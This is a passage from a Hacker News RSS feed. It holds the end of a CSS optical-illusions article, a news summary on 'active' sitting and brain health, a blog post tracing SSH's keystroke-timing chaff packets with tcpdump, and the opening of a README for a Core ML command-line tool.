    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;31 - Animated Ebbinghaus Illusion&lt;/head&gt;
    &lt;p&gt;Earlier, we saw two static versions of the Ebbinghaus illusion. This one is animated. The elements move side to side, and the surrounding shapes grow and shrink, giving the impression that the orange circle is changing size - when it definitely is not.&lt;/p&gt;
    &lt;head rend="h2"&gt;32 - Psychokinematic Tower&lt;/head&gt;
    &lt;p&gt;This looks like a three-dimensional tower spinning in space, as seen from above. In reality, it is a flat, two-dimensional image rotating.&lt;/p&gt;
    &lt;p&gt;Mouse over the demo to stop the rotation and the illusion of depth disappears entirely.&lt;/p&gt;
    &lt;head rend="h2"&gt;33 - Color Fan&lt;/head&gt;
    &lt;p&gt;This optical illusion requires only two gradients: a conic gradient for the fan-shaped arms and a radial gradient for the circles and discs.&lt;/p&gt;
    &lt;p&gt;If you focus on the black dot, the illustration may appear to develop a darker greenish or brownish border. However, the colors never change.&lt;/p&gt;
    &lt;head rend="h2"&gt;34 - Reverse Spoke Illusion&lt;/head&gt;
    &lt;p&gt;This illusion is delightful and disorienting. While the background colors of the wheel are spinning, the spokes remain fixed. However, they appear to rotate in the opposite direction. In reality, only the background is moving.&lt;/p&gt;
    &lt;head rend="h2"&gt;35 - Motion Binding&lt;/head&gt;
    &lt;p&gt;What do you see in this animation? Most people report two sets of lines operating independently: one moving horizontally and another moving vertically. And that is exactly how it looks.&lt;/p&gt;
    &lt;p&gt;In reality, it is a single shape moving uniformly. Run the demo, mouse over the lines, and the true motion will be revealed.&lt;/p&gt;
    &lt;head rend="h2"&gt;36 - Mainz-Linez Illusion&lt;/head&gt;
    &lt;p&gt;Focus on one of the red dots. You will notice it moves straight up and down along a vertical path. Now shift your focus to one of the black crosses in the center. Suddenly, the red dots appear to zigzag instead of moving straight.&lt;/p&gt;
    &lt;p&gt;The CSS code for the wavy lines is adapted from a Temani Afif snippet on CSS-Tricks and his wavy shape generator.&lt;/p&gt;
    &lt;head rend="h2"&gt;37 - Waddling Colors&lt;/head&gt;
    &lt;p&gt;It may look like the boxes are moving at different speeds or like a set of walking feet. In reality, all elements move at the same pace and in parallel. Mouse over the demo to reveal the effect.&lt;/p&gt;
    &lt;p&gt;The illusion also works when the "feet" move in circles, as shown in this alternative version:&lt;/p&gt;
    &lt;head rend="h2"&gt;38 - Dotted-Line Motion&lt;/head&gt;
    &lt;p&gt;Follow the red dot as it moves sideways. From the corner of your vision, it may appear that the dashed black-and-white lines are moving closer together (when the dot moves left) or farther apart (when it moves right). In reality, the lines are completely static.&lt;/p&gt;
    &lt;head rend="h2"&gt;39 - Contrast Asynchrony&lt;/head&gt;
    &lt;p&gt;These dots always have the same color. However, when placed against alternating backgrounds, they appear to jump or move out of sync because of how they blend with their surroundings.&lt;/p&gt;
    &lt;p&gt;Mouse over the demo to remove the background and the illusion disappears.&lt;/p&gt;
    &lt;head rend="h2"&gt;40 - Breathing Square&lt;/head&gt;
    &lt;p&gt;This illusion gives the impression that a blue square is growing and shrinking rhythmically, almost as if it were breathing or beating like a heart.&lt;/p&gt;
    &lt;p&gt;Although the image is rotating, its size never changes. Mouse over the illustration to remove the green boxes and reveal the rotating blue square.&lt;/p&gt;
    &lt;head rend="h2"&gt;41 - Troxler Fading&lt;/head&gt;
    &lt;p&gt;This illustration shows a circle made of pink dots, with one dot missing. Focus on the cross at the center and the missing dot will appear as a yellow or green dot, giving the impression that it is "eating" the pink dots. Just like Pac-Man.&lt;/p&gt;
    &lt;p&gt;I could have used CSS trigonometric functions to calculate the exact positions of the dots, but since they never change, I chose to hardcode the values instead.&lt;/p&gt;
    &lt;p&gt;Here is a related effect. Follow the light gray circle as it spins, and the darker circles will appear to change from gray to greenish. Focus on the cross at the center, and after a short time, the darker circles may begin to fade entirely.&lt;/p&gt;
    &lt;head rend="h2"&gt;42 - Pinna-Brelstaff Illusion&lt;/head&gt;
    &lt;p&gt;This illusion is particularly dizzying. Follow the bluish dot as it moves from right to left and back again. It will appear as though parts of the tiled background are shifting, even though they are static. The only moving element is the dot.&lt;/p&gt;
    &lt;p&gt; From a CSS perspective, I coded the pattern using conic gradients, and applied it to the &lt;code&gt;::before&lt;/code&gt; and &lt;code&gt;::after&lt;/code&gt; pseudo-elements. I then flipped one upside down and clipped it.&lt;/p&gt;
    &lt;head rend="h2"&gt;43 - Palisade&lt;/head&gt;
    &lt;p&gt;The radii of a wheel, when viewed through a palisade, appear to curve. In reality, they are perfectly straight. Mouse over the demo to remove the palisade and you will see that the radii never bend.&lt;/p&gt;
    &lt;head rend="h2"&gt;44 - Alternative Motion&lt;/head&gt;
    &lt;p&gt;This animation demonstrates how our minds infer motion that may not actually be there. Consider the two blue dots. Different people perceive different movements: side to side, top to bottom, or even circular motion.&lt;/p&gt;
    &lt;p&gt;Cover the right side of the animation so that you see only one dot at a time. The motion now appears vertical. Cover the bottom part instead, and the motion appears horizontal. This is our brain trying to complete the movement.&lt;/p&gt;
    &lt;head rend="h2"&gt;45 - Motion Inversion&lt;/head&gt;
    &lt;p&gt;These two illustrations are identical - same shapes, same animation. The only difference is the CSS timing function.&lt;/p&gt;
    &lt;p&gt;The top animation moves smoothly from right to left. The bottom one appears to move choppily in the same direction, but if you focus on it, it may suddenly seem to reverse direction and move faster.&lt;/p&gt;
    &lt;p&gt;Most of the inspiration for these optical illusions came from two excellent resources:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;"35 optical illusions and why they trick your brain" by Patrick Pester.&lt;/item&gt;
      &lt;item&gt;"154 Visual Phenomena &amp;amp; Optical Illusions" with explanations by Michael Bach&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You can also find this article on:&lt;/p&gt;
    &lt;p&gt;(You can leave comments on those platforms and I will reply there).&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46722570</guid><pubDate>Thu, 22 Jan 2026 17:41:22 +0000</pubDate></item><item><title>Recent discoveries on the acquisition of the highest levels of human performance</title><link>https://www.science.org/doi/abs/10.1126/science.adt7790</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46722853</guid><pubDate>Thu, 22 Jan 2026 18:01:02 +0000</pubDate></item><item><title>'Active' sitting is better for brain health: review of studies</title><link>https://www.sciencealert.com/not-all-sitting-is-equal-one-type-was-just-linked-to-better-brain-health</link><description>&lt;doc fingerprint="7a2301352c29c929"&gt;
  &lt;main&gt;
    &lt;p&gt;Excessive sitting isn't good for a person's physical or mental health, but there's a type of sedentary activity that may not shrink our brains or cost our cognition to the same extent.&lt;/p&gt;
    &lt;p&gt;A systematic review of 85 studies has now found good reason to differentiate between 'active' sitting, like playing cards or reading, and 'passive' sitting, like watching TV.&lt;/p&gt;
    &lt;p&gt;The former may actually boost brain health.&lt;/p&gt;
    &lt;p&gt;That's probably because active sitting engages the brain, whereas passive sitting lets a person take a back seat both physically and cognitively.&lt;/p&gt;
    &lt;p&gt;Related: Scientists Revealed How Much Exercise You Need to 'Offset' Sitting All Day&lt;/p&gt;
    &lt;p&gt;"Total sitting time has been shown to be related to brain health; however, sitting is often treated as a single entity, without considering the specific type of activity," explains public health researcher Paul Gardiner from the University of Queensland in Australia.&lt;/p&gt;
    &lt;p&gt;"Most people spend many hours sitting each day, so the type of sitting really matters … These findings show that small everyday choices – like reading instead of watching television – may help keep your brain healthier as you age."&lt;/p&gt;
    &lt;p&gt;Obviously, exercise remains incredibly important for cognitive health, but giving your brain a workout is also important, and that doesn't necessarily mean you have to be on your feet.&lt;/p&gt;
    &lt;p&gt;Across numerous studies, Gardiner and colleagues found that active sitting activities, like reading, playing card games, and using a computer, showed "overwhelmingly positive associations with cognitive health, enhancing cognitive functions such as executive function, situational memory, and working memory."&lt;/p&gt;
    &lt;p&gt;Meanwhile, passive sitting was most consistently associated with negative cognitive outcomes, including increased risk of dementia.&lt;/p&gt;
    &lt;p&gt;The effect sizes were small but significant. The study authors hope their results will help inform future health research and more nuanced health guidance.&lt;/p&gt;
    &lt;p&gt;For example, the researchers suggest guidelines should recognize the difference between passively watching TV and actively using a computer, and encourage people to take short breaks to stimulate their brains and move.&lt;/p&gt;
    &lt;p&gt;Their review focused on studies of typical sedentary activities in natural settings, rather than structured programs designed to boost brain function, making it relevant to people's everyday lives.&lt;/p&gt;
    &lt;p&gt;"Health advice could shift from simply saying 'sit less' to encouraging more mentally engaging activities while sitting," argues Gardiner.&lt;/p&gt;
    &lt;p&gt;"This could help people make easy, realistic changes that support long‑term brain health and potentially reduce dementia risk."&lt;/p&gt;
    &lt;p&gt;The study was published in the Journal of Alzheimer's Disease.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46723694</guid><pubDate>Thu, 22 Jan 2026 19:03:56 +0000</pubDate></item><item><title>Why does SSH send 100 packets per keystroke?</title><link>https://eieio.games/blog/ssh-sends-100-packets-per-keystroke/</link><description>&lt;doc fingerprint="c61ded10eca0acfa"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Why does SSH send 100 packets per keystroke?&lt;/head&gt;
    &lt;p&gt;And why do I care?&lt;/p&gt;
    &lt;p&gt;Jan 22, 2026&lt;/p&gt;
    &lt;p&gt;Here are a few lines of summarized &lt;code&gt;tcpdump&lt;/code&gt; output for an ssh session where I send a single keystroke:&lt;/p&gt;
    &lt;code&gt;$ ./first_lines_of_pcap.sh single-key.pcap
  1   0.000s  CLIENT-&amp;gt;SERVER   36 bytes
  2   0.007s  SERVER-&amp;gt;CLIENT  564 bytes
  3   0.015s  CLIENT-&amp;gt;SERVER    0 bytes
  4   0.015s  CLIENT-&amp;gt;SERVER   36 bytes
  5   0.015s  SERVER-&amp;gt;CLIENT   36 bytes
  6   0.026s  CLIENT-&amp;gt;SERVER    0 bytes
  7   0.036s  CLIENT-&amp;gt;SERVER   36 bytes
  8   0.036s  SERVER-&amp;gt;CLIENT   36 bytes
  9   0.046s  CLIENT-&amp;gt;SERVER    0 bytes
 10   0.059s  CLIENT-&amp;gt;SERVER   36 bytes
&lt;/code&gt;
    &lt;p&gt;I said a “few” because there are a lot of these lines.&lt;/p&gt;
    &lt;code&gt;$ ./summarize_pcap.sh single-key.pcap
Total packets: 270

  36-byte msgs:   179 packets ( 66.3%)   6444 bytes
  Other data:       1 packet  (  0.4%)    564 bytes
  TCP ACKs:        90 packets ( 33.3%)

  Data sent:      6444 bytes in 36-byte messages,  564 bytes in other data
  Ratio:          11.4x more data in 36-byte messages than other data

  Data packet rate: ~90 packets/second (avg 11.1 ms between data packets)
&lt;/code&gt;
    &lt;p&gt;That is a lot of packets for one keypress. What’s going on here? Why do I care?&lt;/p&gt;
    &lt;head class="sc-4d1d4ca-1 bowwWe"&gt;here's those scripts if you're curious&lt;/head&gt;
    &lt;code&gt;# first_lines_of_pcap.sh
tshark -r "$1" \
  -T fields -e frame.number -e frame.time_relative -e ip.src -e ip.dst -e tcp.len | \
  awk 'NR&amp;lt;=10 {dir = ($3 ~ /71\.190/ ? "CLIENT-&amp;gt;SERVER" : "SERVER-&amp;gt;CLIENT");
       printf "%3d  %6.3fs  %-4s  %3s bytes\n", $1, $2, dir, $5}'
&lt;/code&gt;
    &lt;code&gt;# summarize_pcap.sh
tshark -r "$1" -Y "frame.time_relative &amp;lt;= 2.0" -T fields -e frame.time_relative -e tcp.len | awk '
  {
      count++
      payload = $2

      if (payload == 0) {
          acks++
      } else if (payload == 36) {
          mystery++
          if (NR &amp;gt; 1 &amp;amp;&amp;amp; prev_data_time &amp;gt; 0) {
              delta = $1 - prev_data_time
              sum_data_deltas += delta
              data_intervals++
          }
          prev_data_time = $1
      } else {
          game_data++
          game_bytes = payload
          if (NR &amp;gt; 1 &amp;amp;&amp;amp; prev_data_time &amp;gt; 0) {
              delta = $1 - prev_data_time
              sum_data_deltas += delta
              data_intervals++
          }
          prev_data_time = $1
      }
  }
  END {
      print "Total packets:", count
      print ""
      printf "  36-byte msgs:   %3d packets (%5.1f%%)  %5d bytes\n", mystery, 100*mystery/count, mystery*36
      printf "  Other data:     %3d packet  (%5.1f%%)  %5d bytes\n", game_data, 100*game_data/count, game_bytes
      printf "  TCP ACKs:       %3d packets (%5.1f%%)\n", acks, 100*acks/count
      print ""
      printf "  Data sent:      %d bytes in 36-byte messages,  %d bytes in other data\n", mystery*36, game_bytes
      printf "  Ratio:          %.1fx more data in 36-byte messages than other data\n", (mystery*36)/game_bytes
      print ""
      avg_ms = (sum_data_deltas / data_intervals) * 1000
      printf "  Data packet rate: ~%d packets/second (avg %.1f ms between data packets)\n", int(1000/avg_ms + 0.5), avg_ms
  }'
&lt;/code&gt;
    &lt;head rend="h2"&gt;Discovery&lt;/head&gt;
    &lt;p&gt;I am working on a high-performance game that runs over ssh. The TUI for the game is created in bubbletea 1 and sent over ssh via wish.&lt;/p&gt;
    &lt;p&gt;I have also forked bubbletea to make it faster. Stay tuned!&lt;/p&gt;
    &lt;p&gt;The game is played in an 80x60 window that I update 10 times a second. I’m targeting at least 2,000 concurrent players, which means updating ~100 million cells a second. I care about performance.&lt;/p&gt;
    &lt;p&gt;So I have a script that connects a few hundred bots over ssh and has them make a move a second. Then I use go’s outstanding profiling tools to look at what’s going on.&lt;/p&gt;
    &lt;p&gt;Yesterday I inadvertently broke my test harness. Instead of regularly sending game data, my server sent the bots a single message that said “your screen is too small.” This cut my game’s CPU and bandwidth usage in half.&lt;/p&gt;
    &lt;p&gt;At first I was disappointed. I (briefly) thought I had a free massive speedup on my hands, but it was actually a testing error.&lt;/p&gt;
    &lt;p&gt;But wait.&lt;/p&gt;
    &lt;p&gt;If I wasn’t sending game data back to my bots, why did CPU usage drop by 50% instead of 100%?&lt;/p&gt;
    &lt;head rend="h2"&gt;Investigation&lt;/head&gt;
    &lt;p&gt;As part of debugging the test harness issue, I used &lt;code&gt;tcpdump&lt;/code&gt; to log game traffic with and without the breaking change. Something like:&lt;/p&gt;
    &lt;code&gt;# The game runs on port 22
timeout 30s tcpdump -i eth0 'port 22' -w with-breaking-change.pcap
# Revert change
timeout 30s tcpdump -i eth0 'port 22' -w without-breaking-change.pcap
&lt;/code&gt;
    &lt;p&gt;Our breaking change stopped us from rendering our game over ssh. So &lt;code&gt;with-breaking-change.pcap&lt;/code&gt; contains packets that represent the overhead of each connection without actually rendering the game.&lt;/p&gt;
    &lt;p&gt;I was debugging this with Claude Code, so I asked it to summarize what it saw in the pcap.&lt;/p&gt;
    &lt;code&gt;Wanna take a look yourself? I put with-breaking-change.pcap in this directory

--

Wow! Here's what I found:

Packet Size Distribution (413,703 total packets):
274,907 packets (66%): Exactly 36 bytes
138,778 packets (34%): 0 bytes (TCP ACKs)
18 packets (&amp;lt;0.1%): 72 bytes
&lt;/code&gt;
    &lt;p&gt;Further analysis on a smaller pcap pointed to these mysterious packets arriving ~20ms apart.&lt;/p&gt;
    &lt;p&gt;This was baffling to me (and to Claude Code). We kicked around several ideas like:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;SSH flow control messages&lt;/item&gt;
      &lt;item&gt;PTY size polling or other status checks&lt;/item&gt;
      &lt;item&gt;Some quirk of bubbletea or wish&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;One thing stood out - these exchanges were initiated by my ssh client (stock ssh installed on MacOS) - not by my server.&lt;/p&gt;
    &lt;p&gt;On a hunch, I took a &lt;code&gt;tcpdump&lt;/code&gt; of a regular ssh session.&lt;/p&gt;
    &lt;code&gt;# on my mac, in one tab
sudo tcpdump -ien0 'port 22'

# on my mac, in another tab
ssh $some_vm_of_mine
&lt;/code&gt;
    &lt;p&gt;I waited for the initial connection chatter to die down, sent one keystroke to my remote vm, and looked at the &lt;code&gt;tcpdump&lt;/code&gt; output.&lt;/p&gt;
    &lt;p&gt;I saw the exact same pattern! What in the world?&lt;/p&gt;
    &lt;head rend="h2"&gt;Root cause&lt;/head&gt;
    &lt;p&gt;Once I realized that this was a property of stock ssh and not my game, debugging got a lot easier.&lt;/p&gt;
    &lt;p&gt;Running &lt;code&gt;ssh -vvv&lt;/code&gt; gave me a pretty good sense of what was going on:&lt;/p&gt;
    &lt;code&gt;debug3: obfuscate_keystroke_timing: starting: interval ~20ms
debug3: obfuscate_keystroke_timing: stopping: chaff time expired (49 chaff packets sent) 
debug3: obfuscate_keystroke_timing: starting: interval ~20ms
debug3: obfuscate_keystroke_timing: stopping: chaff time expired (101 chaff packets sent)
&lt;/code&gt;
    &lt;p&gt;That &lt;code&gt;20ms&lt;/code&gt; is a smoking gun - it lines up perfectly with the mysterious pattern we saw earlier! And the rest of the message is pretty helpful too - we sent 49 “chaff” packets for the first keystroke and 101 “chaff” for around the second one.&lt;/p&gt;
    &lt;p&gt;In 2023, ssh added keystroke timing obfuscation. The idea is that the speed at which you type different letters betrays some information about which letters you’re typing. So ssh sends lots of “chaff” packets along with your keystrokes to make it hard for an attacker to determine when you’re actually entering keys.&lt;/p&gt;
    &lt;p&gt;That makes a lot of sense for regular ssh sessions, where privacy is critical. But it’s a lot of overhead for an open-to-the-whole-internet game where latency is critical.&lt;/p&gt;
    &lt;head rend="h2"&gt;Remediation&lt;/head&gt;
    &lt;p&gt;Keystroke obfuscation can be disabled client-side. After reverting my original breaking change, I tried updating my test harness to pass &lt;code&gt;ObscureKeystrokeTiming=no&lt;/code&gt; when starting up ssh sessions.&lt;/p&gt;
    &lt;p&gt;This worked great. CPU usage dropped dramatically and bots still received valid data.&lt;/p&gt;
    &lt;p&gt;But this is hardly a solution in the real world. I want &lt;code&gt;ssh mygame&lt;/code&gt; to Just Work without asking users to pass options that they might not understand.&lt;/p&gt;
    &lt;p&gt;Claude Code originally didn’t have much faith that we could disable this functionality server-side.&lt;/p&gt;
    &lt;p&gt;generated with simon wilson's excellent claude-code-transcripts tool&lt;/p&gt;
    &lt;p&gt;Fortunately, the description I found of SSH keystroke obfuscation made it easy to look up the relevant code in go’s ssh library (which I was transitively depending on).&lt;/p&gt;
    &lt;code&gt;Log message:
Introduce a transport-level ping facility

This adds a pair of SSH transport protocol messages SSH2_MSG_PING/PONG
to implement a ping capability. These messages use numbers in the "local
extensions" number space and are advertised using a "[email protected]"
ext-info message with a string version number of "0".
&lt;/code&gt;
    &lt;p&gt;The “chaff” messages that ssh uses to obscure keystrokes are SSH2_MSG_PING messages. And they’re sent to servers that advertise the availability of the &lt;code&gt;[email protected]&lt;/code&gt; extension. What if we just…don’t advertise &lt;code&gt;[email protected]&lt;/code&gt;?&lt;/p&gt;
    &lt;p&gt;I searched go’s ssh library for &lt;code&gt;[email protected]&lt;/code&gt; and found the commit where support was added. The commit was tiny and seemed very easy to revert.&lt;/p&gt;
    &lt;p&gt;I cloned the go crypto repo and told Claude to revert this change and update our dependencies to use our clone (go’s replace directive makes forking a library very easy).&lt;/p&gt;
    &lt;p&gt;Then I re-ran my test harness. The results were…very good:&lt;/p&gt;
    &lt;code&gt;Total CPU  29.90%          -&amp;gt; 11.64%
Syscalls   3.10s           -&amp;gt; 0.66s
Crypto     1.6s            -&amp;gt; 0.11s
Bandwidth  ~6.5 Mbit/sec   -&amp;gt; ~3 Mbit/sec
&lt;/code&gt;
    &lt;p&gt;Claude was also pretty pumped:&lt;/p&gt;
    &lt;p&gt;yes it's 1:30 am what of it&lt;/p&gt;
    &lt;p&gt;Obviously forking go’s crypto library is a little scary, and I’m gonna have to do some thinking about how to maintain my little patch in a safe way.&lt;/p&gt;
    &lt;p&gt;But this is a huge improvement. I’ve spent much of the last week squeezing out small single-digit performance wins. A &amp;gt;50% drop was unimaginable to me.&lt;/p&gt;
    &lt;head rend="h2"&gt;Debugging with LLMs was fun&lt;/head&gt;
    &lt;p&gt;I’ve been thinking about whether LLMs remove parts of the problem-solving process that I enjoy. But I’ve gotta say, debugging this problem using Claude Code was super fun.&lt;/p&gt;
    &lt;p&gt;I am familiar enough with &lt;code&gt;tcpdump&lt;/code&gt;, &lt;code&gt;tshark&lt;/code&gt;, and friends to know what they can do. But I don’t use them regularly enough to be fast with them. Being able to tell an agent “here’s a weird pcap - tell me what’s going on” was really lovely. And by watching commands as the agent ran them I was able to keep my mental model of the problem up to date.&lt;/p&gt;
    &lt;p&gt;There were still edge cases. At some point in my confusion I switched to ChatGPT and it very confidently told me that my tcpdump output was normal ssh behavior:&lt;/p&gt;
    &lt;p&gt;do all chatgpt messages have this tone and formatting now?&lt;/p&gt;
    &lt;p&gt;And then doubled down when I pushed back:&lt;/p&gt;
    &lt;p&gt;no!!!&lt;/p&gt;
    &lt;p&gt;Similarly, I had to push Claude Code to consider forking go’s ssh library. And I had to make the original leap of “wait…if our test harness was broken, why was usage not 0%?”&lt;/p&gt;
    &lt;p&gt;When you say “LLMs did not fully solve this problem” some people tend to respond with “you’re holding it wrong!”&lt;/p&gt;
    &lt;p&gt;I think they’re sometimes right! Interacting with LLMs is a new skill, and it feels pretty weird if you’re used to writing software like it’s 2020. A more talented user of LLMs may have trivially solved this problem.&lt;/p&gt;
    &lt;p&gt;But the best way to develop a skill is by practicing it. And for me, that means figuring out how to transfer my problem-solving intuitions to the tools that I’m using.&lt;/p&gt;
    &lt;p&gt;Besides. Being in the loop is fun. How else would I write this post?&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46723990</guid><pubDate>Thu, 22 Jan 2026 19:27:32 +0000</pubDate></item><item><title>Show HN: CLI for working with Apple Core ML models</title><link>https://github.com/schappim/coreml-cli</link><description>&lt;doc fingerprint="7f5845526018551a"&gt;
  &lt;main&gt;
    &lt;p&gt;A native command-line interface for working with Apple Core ML models on macOS. Inspect, run inference, benchmark, and manage Core ML models without Xcode or Python.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Inspect - View model structure, inputs/outputs, and metadata&lt;/item&gt;
      &lt;item&gt;Predict - Run inference on images, text, or JSON data&lt;/item&gt;
      &lt;item&gt;Batch - Process multiple files with concurrent execution&lt;/item&gt;
      &lt;item&gt;Benchmark - Measure inference latency and throughput&lt;/item&gt;
      &lt;item&gt;Compile - Convert &lt;code&gt;.mlmodel&lt;/code&gt;to optimized&lt;code&gt;.mlmodelc&lt;/code&gt;format&lt;/item&gt;
      &lt;item&gt;Metadata - View and manage model metadata&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;brew tap schappim/coreml-cli
brew install coreml-cli&lt;/code&gt;
    &lt;p&gt;Download the latest release from GitHub Releases:&lt;/p&gt;
    &lt;code&gt;curl -L https://github.com/schappim/coreml-cli/releases/download/v1.0.0/coreml-1.0.0-macos.tar.gz -o coreml.tar.gz
tar -xzf coreml.tar.gz
sudo mv coreml /usr/local/bin/&lt;/code&gt;
    &lt;p&gt;Requires macOS 13+ and Swift 5.9+&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/schappim/coreml-cli.git
cd coreml-cli
swift build -c release
sudo cp .build/release/coreml /usr/local/bin/&lt;/code&gt;
    &lt;code&gt;coreml --version
# coreml 1.0.0&lt;/code&gt;
    &lt;p&gt;View model structure, inputs, outputs, and metadata:&lt;/p&gt;
    &lt;code&gt;coreml inspect MobileNetV2.mlmodel&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;code&gt;Model: MobileNetV2
Size: 24.7 MB
Compiled: No

Inputs:
  image: image 224x224 BGRA32

Outputs:
  classLabel: string
  classLabelProbs: dictionary

Metadata:
  Author: Original Paper: Mark Sandler, Andrew Howard...
  Description: Detects the dominant objects present in an image...
&lt;/code&gt;
    &lt;p&gt;JSON output for scripting:&lt;/p&gt;
    &lt;code&gt;coreml inspect MobileNetV2.mlmodel --json&lt;/code&gt;
    &lt;p&gt;Classify an image:&lt;/p&gt;
    &lt;code&gt;coreml predict MobileNetV2.mlmodel --input photo.jpg&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;code&gt;Input: photo.jpg
Inference time: 1.66 ms

Outputs:
  classLabel: golden retriever
  classLabelProbs: golden retriever: 0.8721, Labrador retriever: 0.0543...
&lt;/code&gt;
    &lt;p&gt;Save results to file:&lt;/p&gt;
    &lt;code&gt;coreml predict MobileNetV2.mlmodel --input photo.jpg --output results.json --json&lt;/code&gt;
    &lt;p&gt;Select compute device:&lt;/p&gt;
    &lt;code&gt;coreml predict MobileNetV2.mlmodel --input photo.jpg --device ane  # Apple Neural Engine
coreml predict MobileNetV2.mlmodel --input photo.jpg --device gpu  # GPU
coreml predict MobileNetV2.mlmodel --input photo.jpg --device cpu  # CPU only&lt;/code&gt;
    &lt;p&gt;Process a directory of images:&lt;/p&gt;
    &lt;code&gt;coreml batch MobileNetV2.mlmodel --dir ./photos --out ./results --format csv&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;code&gt;Found 100 input files
Results written to: ./results/results.csv

Processed 100 files in 892.45 ms
Average inference time: 2.15 ms
&lt;/code&gt;
    &lt;p&gt;Control concurrency:&lt;/p&gt;
    &lt;code&gt;coreml batch MobileNetV2.mlmodel --dir ./photos --out ./results --concurrency 8&lt;/code&gt;
    &lt;p&gt;Measure inference latency:&lt;/p&gt;
    &lt;code&gt;coreml benchmark MobileNetV2.mlmodel --input sample.jpg&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;code&gt;Benchmark Results for: MobileNetV2
==================================================

Configuration:
  Device: all
  Iterations: 100
  Warmup: 10

Latency (ms):
  Mean:      1.279
  Min:       1.008
  Max:       1.602
  StdDev:    0.204

Percentiles (ms):
  P50:       1.200
  P95:       1.523
  P99:       1.589

Throughput: 781.86 inferences/sec
&lt;/code&gt;
    &lt;p&gt;Custom iterations:&lt;/p&gt;
    &lt;code&gt;coreml benchmark MobileNetV2.mlmodel --input sample.jpg -n 500 --warmup 50&lt;/code&gt;
    &lt;p&gt;JSON output for CI/CD:&lt;/p&gt;
    &lt;code&gt;coreml benchmark MobileNetV2.mlmodel --input sample.jpg --json &amp;gt; benchmark.json&lt;/code&gt;
    &lt;p&gt;Compile &lt;code&gt;.mlmodel&lt;/code&gt; to optimized &lt;code&gt;.mlmodelc&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;coreml compile MobileNetV2.mlmodel&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;code&gt;Compilation successful!
  Source: /path/to/MobileNetV2.mlmodel
  Output: /path/to/MobileNetV2.mlmodelc
  Original size: 24.7 MB
  Compiled size: 24.5 MB
&lt;/code&gt;
    &lt;p&gt;With validation:&lt;/p&gt;
    &lt;code&gt;coreml compile MobileNetV2.mlmodel --validate --output-dir ./compiled/&lt;/code&gt;
    &lt;p&gt;Get model metadata:&lt;/p&gt;
    &lt;code&gt;coreml meta get MobileNetV2.mlmodel&lt;/code&gt;
    &lt;p&gt;Output:&lt;/p&gt;
    &lt;code&gt;Metadata for: MobileNetV2.mlmodel

  Author:      Original Paper: Mark Sandler, Andrew Howard...
  Description: Detects the dominant objects present in an image...
  License:     Please see https://github.com/tensorflow/tensorflow...
  Version:     1.0
&lt;/code&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Command&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;coreml inspect &amp;lt;model&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Inspect model structure and metadata&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;coreml predict &amp;lt;model&amp;gt; -i &amp;lt;input&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Run inference on a single input&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;coreml batch &amp;lt;model&amp;gt; --dir &amp;lt;dir&amp;gt; --out &amp;lt;dir&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Batch process multiple inputs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;coreml benchmark &amp;lt;model&amp;gt; -i &amp;lt;input&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Benchmark model performance&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;coreml compile &amp;lt;model&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Compile model to optimized format&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;coreml meta get &amp;lt;model&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;View model metadata&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Option&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;--json&lt;/code&gt;, &lt;code&gt;-j&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;Output in JSON format&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;--device &amp;lt;device&amp;gt;&lt;/code&gt;
        &lt;/cell&gt;
